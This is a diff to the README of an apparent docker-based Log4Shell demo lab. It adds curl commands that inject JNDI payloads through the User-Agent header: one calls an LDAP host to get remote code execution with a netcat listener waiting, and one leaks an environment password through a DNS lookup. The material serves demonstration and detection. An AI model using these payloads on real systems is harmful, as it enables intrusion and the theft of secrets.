@@ -47,14 +47,22 @@ docker-compose build
         1. Select the "login" button
         1. Check for connection on your `nc` listener
 
-### Run Web App Attack Demo
+### Run a User Agent Attack Demo
 
 1. Setup your docker listener in the first terminal
     1. `nc -lv 10.10.10.31 9001`
 1. Start the docker containers in a second terminal
     1. `docker-compose up`
-1. In a third terminal, run the following. The IP is the ip address of the docker host
-    1. `python3 log4j_rce_check.py http://10.10.10.31:8080/log4shell --attacker-host 10.10.10.31:11389 --timeout=2`
+1. In a third terminal, run the following. The second IP is the docker host
+    1. `curl -A "\${jndi:ldap://172.16.238.11:1389/a}" http://10.10.10.31:8080/log4shell`
+
+### Run a DNS Exfil Demo
+
+1. Start the docker containers in a terminal
+    1. `docker-compose up`
+1. In a second terminal, run the following. The IP is the ip address of the docker host
+    1. `curl -A "\${jndi:dns://10.10.10.31/\${env:POC_PASSWORD}}" http://10.10.10.31:8080/log4shell/`
+1. The vulnerable web server will attempt to do a TXT lookup at the given IP. See log4j-dns_exfil.pcap
 
 ### Detect UA Vulnerability
 1. cd scripts
